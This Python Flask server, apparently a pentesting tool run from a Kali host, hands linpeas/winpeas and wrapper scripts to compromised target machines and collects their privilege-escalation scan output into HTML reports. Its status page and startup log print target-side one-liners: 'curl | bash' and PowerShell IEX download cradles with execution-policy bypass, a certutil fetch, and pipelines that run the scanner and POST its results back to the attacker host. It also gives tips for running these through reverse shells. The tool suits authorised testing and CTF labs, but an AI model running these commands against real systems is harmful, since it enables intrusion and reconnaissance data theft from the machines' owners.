#!/usr/bin/env python3
"""
ParsingPeas Receiver - Kali Host Server
Receives linpeas/winpeas output and generates interactive HTML reports
"""

import os
import sys
import argparse
import hashlib
import socket
import subprocess
import time
import requests
from flask import Flask, request, jsonify, send_from_directory, send_file, render_template_string
from werkzeug.exceptions import RequestEntityTooLarge
from datetime import datetime
import json

app = Flask(__name__)

# Configuration
OUTPUT_DIR = "./received_outputs"
REPORTS_DIR = "./reports"
SCRIPTS_DIR = "./scripts"
MAX_UPLOAD_SIZE = 10 * 1024 * 1024  # 10MB

# Enforce the upload limit at the framework level (Flask rejects larger bodies
# with HTTP 413 before they are buffered into memory).
app.config['MAX_CONTENT_LENGTH'] = MAX_UPLOAD_SIZE

# Create directories
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(REPORTS_DIR, exist_ok=True)
os.makedirs(SCRIPTS_DIR, exist_ok=True)


def safe_token(value, fallback):
    """Sanitise an attacker-controlled header value before using it in a
    filename. Prevents path traversal (e.g. X-Hostname: ../../etc/foo) and
    keeps names tidy."""
    import re as _re
    cleaned = _re.sub(r'[^A-Za-z0-9._-]', '_', (value or '').strip())
    cleaned = cleaned.strip('.')  # no leading/trailing dots
    return cleaned[:64] or fallback

# Active sessions tracking
active_sessions = {}

# PEASS script URLs
LINPEAS_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
WINPEAS_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"


def log(msg):
    """Print with immediate flush"""
    print(msg)
    sys.stdout.flush()


def get_interface_ip(iface, timeout=5):
    """Return the IPv4 address configured on a local interface, or None.

    Uses `ip -4 -o addr show dev <iface>` (no privileges needed, no extra
    dependency) and falls back to the SIOCGIFADDR ioctl when iproute2 is not
    available. An interface that exists but has no IPv4 address yields None.
    """
    if not iface:
        return None

    try:
        result = subprocess.run(
            ['ip', '-4', '-o', 'addr', 'show', 'dev', iface],
            capture_output=True, text=True, timeout=timeout
        )
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                fields = line.split()
                if 'inet' in fields:
                    return fields[fields.index('inet') + 1].split('/')[0]
            return None  # interface exists, no IPv4 address
    except (OSError, subprocess.SubprocessError):
        pass  # no iproute2 -> try the ioctl below

    try:
        import fcntl
        import struct

        siocgifaddr = 0x8915
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            packed = struct.pack('256s', iface[:15].encode('utf-8'))
            raw = fcntl.ioctl(sock.fileno(), siocgifaddr, packed)
            return socket.inet_ntoa(raw[20:24])
    except Exception:
        return None


def list_ipv4_interfaces():
    """Return [(interface, address), ...] for every interface with an IPv4 address.

    Only used to build a helpful error message when -i names a bad interface.
    """
    found = []
    try:
        result = subprocess.run(
            ['ip', '-4', '-o', 'addr', 'show'],
            capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.splitlines():
            fields = line.split()
            if len(fields) > 3 and 'inet' in fields:
                found.append((fields[1], fields[fields.index('inet') + 1].split('/')[0]))
    except (OSError, subprocess.SubprocessError):
        pass
    return found


def parse_args(argv=None):
    """Parse command line options."""
    parser = argparse.ArgumentParser(
        prog='receiver.py',
        description='ParsingPeas receiver: collects linpeas/winpeas output and '
                    'renders interactive HTML reports.',
        epilog='Without -i the startup hints keep the YOUR_IP placeholder.',
    )
    parser.add_argument(
        '-i', '--interface', metavar='IFACE', default=None,
        help="advertise the local IPv4 address of this interface (e.g. tun0) "
             "in the startup hints instead of YOUR_IP"
    )
    return parser.parse_args(argv)


def download_peass_scripts():
    """Download linpeas and winpeas scripts on startup if not present"""
    linpeas_path = os.path.join(SCRIPTS_DIR, "linpeas.sh")
    winpeas_path = os.path.join(SCRIPTS_DIR, "winpeas.exe")
    
    log("[*] Checking for PEASS scripts...")
    
    # Download linpeas if not present
    if not os.path.exists(linpeas_path):
        log("[*] Downloading linpeas.sh...")
        try:
            response = requests.get(LINPEAS_URL, timeout=30)
            with open(linpeas_path, 'wb') as f:
                f.write(response.content)
            os.chmod(linpeas_path, 0o755)
            log(f"[+] Downloaded linpeas.sh ({len(response.content) / 1024:.2f} KB)")
        except Exception as e:
            log(f"[!] Failed to download linpeas: {e}")
    else:
        log("[+] linpeas.sh already present")
    
    # Download winpeas if not present
    if not os.path.exists(winpeas_path):
        log("[*] Downloading winpeas.exe...")
        try:
            response = requests.get(WINPEAS_URL, timeout=30)
            with open(winpeas_path, 'wb') as f:
                f.write(response.content)
            log(f"[+] Downloaded winpeas.exe ({len(response.content) / 1024:.2f} KB)")
        except Exception as e:
            log(f"[!] Failed to download winpeas: {e}")
    else:
        log("[+] winpeas.exe already present")
    
    log("")


@app.route('/')
def index():
    """Status page showing active sessions and reports"""
    reports = [f for f in os.listdir(REPORTS_DIR) if f.endswith('.html')]
    linpeas_exists = os.path.exists(os.path.join(SCRIPTS_DIR, "linpeas.sh"))
    winpeas_exists = os.path.exists(os.path.join(SCRIPTS_DIR, "winpeas.exe"))
    
    return f"""
    <html>
    <head><title>ParsingPeas - Active</title></head>
    <body style="font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px;">
        <h1>🟢 ParsingPeas Receiver Active</h1>
        <p>Server is running and ready to receive linpeas/winpeas output</p>
        
        <h2>Scripts Available:</h2>
        <ul>
            <li>linpeas.sh: {'✅' if linpeas_exists else '❌ Run setup.sh first'}</li>
            <li>winpeas.exe: {'✅' if winpeas_exists else '❌ Run setup.sh first'}</li>
        </ul>
        
        <h2>Active Sessions: {len(active_sessions)}</h2>
        <h2>Generated Reports: {len(reports)}</h2>
        <ul>
        {''.join([f'<li><a href="/reports/{r}" style="color: #00ff00;">{r}</a></li>' for r in reports])}
        </ul>
        
        <hr>
        <h3>Usage:</h3>
        
        <p><strong>🐧 Linux/macOS targets:</strong></p>
        <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
curl -sSL http://{request.host}/get-script | bash
        </code>
        
        <p><strong>🪟 Windows (PowerShell / reverse shell):</strong></p>
        <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://{request.host}/get-script.ps1')"
        </code>

        <div style="background: #2a1a00; border-left: 4px solid #ff9900; padding: 10px; margin: 15px 0;">
            <strong style="color: #ff9900;">⚠️ Windows shell compatibility:</strong>
            <ul style="color: #ffcc66; margin: 10px 0;">
                <li><strong style="color: #00ff00;">✅ BEST:</strong> nc.exe CMD shell, Metasploit, interactive PowerShell/CMD</li>
                <li><strong style="color: #ffff00;">⚠️ CAUTION:</strong> PowerShell reverse shells may suppress live output</li>
            </ul>
            <p style="color: #ffcc66; margin: 5px 0;">
                <em>No output but uploads work? You're in a PowerShell reverse shell — the scan still
                runs, just watch this receiver for the upload confirmation.</em>
            </p>
        </div>
        
        <p><strong>🪟 Windows - Alternative (2-step for problematic shells):</strong></p>
        <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
certutil -urlcache -f http://{request.host}/get-script.ps1 %TEMP%\\w.ps1<br>
powershell -ExecutionPolicy Bypass -File %TEMP%\\w.ps1
        </code>
        
        <hr>
        <h3>Manual Commands:</h3>
        
        <p><strong>Linux (manual):</strong></p>
        <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
curl http://{request.host}/get-linpeas | bash | curl -X POST --data-binary @- -H "X-Hostname: $(hostname)" http://{request.host}/upload
        </code>
        
        <p><strong>Windows (manual):</strong></p>
        <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
$r=Invoke-RestMethod http://{request.host}/get-winpeas -OutFile $env:TEMP\\w.exe; & $env:TEMP\\w.exe | Out-File $env:TEMP\\o.txt; Invoke-RestMethod http://{request.host}/upload -Method POST -InFile $env:TEMP\\o.txt -Headers @{{"X-Hostname"=$env:COMPUTERNAME}}
        </code>
    </body>
    </html>
    """


@app.route('/get-script')
def get_script():
    """Serve the wrapper script (bash) to target machine"""
    log(f"[→] Serving wrapper.sh to {request.remote_addr}")
    with open('wrapper.sh', 'r') as f:
        script = f.read()
    # Replace placeholder with actual server URL
    script = script.replace('KALI_SERVER_URL', f'http://{request.host}')
    return script, 200, {'Content-Type': 'text/plain'}


@app.route('/get-script.ps1')
def get_script_ps1():
    """Serve the wrapper script (PowerShell) to target machine"""
    log(f"[→] Serving wrapper.ps1 to {request.remote_addr}")
    with open('wrapper.ps1', 'r', encoding='utf-8') as f:
        script = f.read()
    # Replace placeholder with actual server URL
    script = script.replace('KALI_SERVER_URL', f'http://{request.host}')
    return script, 200, {'Content-Type': 'text/plain; charset=utf-8'}


@app.route('/get-linpeas')
def get_linpeas():
    """Serve linpeas.sh to target machine"""
    log(f"[→] Serving linpeas.sh to {request.remote_addr}")
    linpeas_path = os.path.join(SCRIPTS_DIR, "linpeas.sh")
    if not os.path.exists(linpeas_path):
        return "Error: linpeas.sh not found. Run setup.sh first.", 404
    return send_file(linpeas_path, mimetype='text/plain')


@app.route('/get-winpeas')
def get_winpeas():
    """Serve winpeas.exe to target machine"""
    log(f"[→] Serving winpeas.exe to {request.remote_addr}")
    winpeas_path = os.path.join(SCRIPTS_DIR, "winpeas.exe")
    if not os.path.exists(winpeas_path):
        return "Error: winpeas.exe not found. Run setup.sh first.", 404
    return send_file(winpeas_path, mimetype='application/octet-stream')


@app.route('/upload', methods=['POST'])
def upload():
    """Receive linpeas/winpeas output"""
    try:
        # Get session info (header values are attacker-controlled -> sanitise
        # the two that end up in a filename).
        session_id = request.headers.get('X-Session-ID', f'session_{int(time.time())}')
        hostname = safe_token(request.headers.get('X-Hostname'), 'unknown')
        scan_type = safe_token(request.headers.get('X-Scan-Type'), 'linpeas')
        
        log("")
        log("="*60)
        log(f"[←] POST REQUEST RECEIVED from {request.remote_addr}")
        log(f"[*] Session ID: {session_id}")
        log(f"[*] Hostname: {hostname}")
        log(f"[*] Scan Type: {scan_type}")
        log(f"[*] Reading data...")
        
        # Get the data
        data = request.get_data()
        
        if len(data) == 0:
            log("[!] ERROR: No data received!")
            return jsonify({'error': 'No data received'}), 400
        
        file_size = len(data)
        log(f"[+] Received {file_size / 1024:.2f} KB of data")
        
        # Calculate checksum
        log(f"[*] Calculating checksum...")
        checksum = hashlib.md5(data).hexdigest()
        log(f"[+] Checksum: {checksum}")
        
        # Save raw output
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{scan_type}_{hostname}_{timestamp}.txt"
        filepath = os.path.join(OUTPUT_DIR, filename)
        
        log(f"[*] Saving to: {filepath}")
        with open(filepath, 'wb') as f:
            f.write(data)
        log(f"[+] File saved successfully")
        
        # Parse and generate HTML report using correct parser classes
        log(f"[*] Generating HTML report...")
        from parser import PeasParser, ReportGenerator
        
        # Read the file content
        with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()
        
        # Parse and generate report
        parser = PeasParser(content)
        parser.parse()
        generator = ReportGenerator(parser, REPORTS_DIR)
        report_filename = generator.generate()
        report_path = os.path.join(REPORTS_DIR, report_filename)
        
        report_url = f"http://{request.host}/reports/{report_filename}"
        log(f"[+] Report generated: {report_filename}")
        log(f"[+] View at: {report_url}")
        
        # Prepare response
        response_data = {
            'status': 'success',
            'session_id': session_id,
            'filename': filename,
            'size': file_size,
            'checksum': checksum,
            'report_url': f"/reports/{report_filename}"
        }
        
        log(f"[*] Sending response to client...")
        log("="*60)
        log("")
        
        return jsonify(response_data), 200

    except RequestEntityTooLarge:
        limit_mb = MAX_UPLOAD_SIZE // (1024 * 1024)
        log(f"[!] Rejected upload over {limit_mb}MB limit")
        return jsonify({'error': f'Upload exceeds {limit_mb}MB limit'}), 413
    except Exception as e:
        log(f"[!] ERROR in upload handler: {str(e)}")
        import traceback
        traceback.print_exc()
        return jsonify({'error': str(e)}), 500


@app.route('/reports/<path:filename>')
def serve_report(filename):
    """Serve generated HTML reports and ALL associated files (JSON, etc.)"""
    log(f"[→] Serving from reports/: {filename}")
    
    # Set proper MIME types
    mimetype = None
    if filename.endswith('.json'):
        mimetype = 'application/json'
    elif filename.endswith('.html'):
        mimetype = 'text/html'
    elif filename.endswith('.txt'):
        mimetype = 'text/plain'
    
    return send_from_directory(REPORTS_DIR, filename, mimetype=mimetype)


@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({'status': 'healthy', 'active_sessions': len(active_sessions)})


if __name__ == '__main__':
    args = parse_args()

    print("""
    ╔═══════════════════════════════════════╗
    ║       ParsingPeas Receiver v1.3       ║
    ║   Automated linpeas/winpeas Parser    ║
    ║    🐧 Linux  |  🪟 Windows Support    ║
    ╚═══════════════════════════════════════╝
    """)
    log(f"[+] Output directory: {OUTPUT_DIR}")
    log(f"[+] Reports directory: {REPORTS_DIR}")
    log(f"[+] Scripts directory: {SCRIPTS_DIR}")

    # Address shown in the startup hints. Left untouched (YOUR_IP) unless the
    # operator passes -i, in which case it is read from that interface.
    server_ip = 'YOUR_IP'
    if args.interface:
        detected = get_interface_ip(args.interface)
        if detected is None:
            log(f"[!] No IPv4 address found on interface '{args.interface}'")
            available = list_ipv4_interfaces()
            if available:
                log('[!] Interfaces with an IPv4 address: ' +
                    ', '.join(f'{name} ({addr})' for name, addr in available))
            else:
                log('[!] Could not list interfaces (is iproute2 installed?)')
            sys.exit(2)
        server_ip = detected
        log(f"[+] Using {server_ip} (interface {args.interface})")
    log("")
    
    # Download PEASS scripts if needed
    download_peass_scripts()
    
    log(f"[+] Starting server...\n")
    log(f"[+] Linux:       curl -sSL http://{server_ip}:8005/get-script | bash")
    log(f"[+] Windows:     powershell -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://{server_ip}:8005/get-script.ps1')\"")
    log("")
    log(f"⚠️  Windows Shell Compatibility:")
    log(f"   ✅ BEST: nc.exe CMD shells (full output visibility)")
    log(f"   ⚠️  CAUTION: PowerShell reverse shells (may break output/shell)")
    log(f"   ✅ WORKS: Metasploit, Interactive PowerShell/CMD\n")
    log(f"[*] Waiting for connections...\n")
    
    # Run on all interfaces, port 8005
    app.run(host='0.0.0.0', port=8005, debug=False, threaded=True)
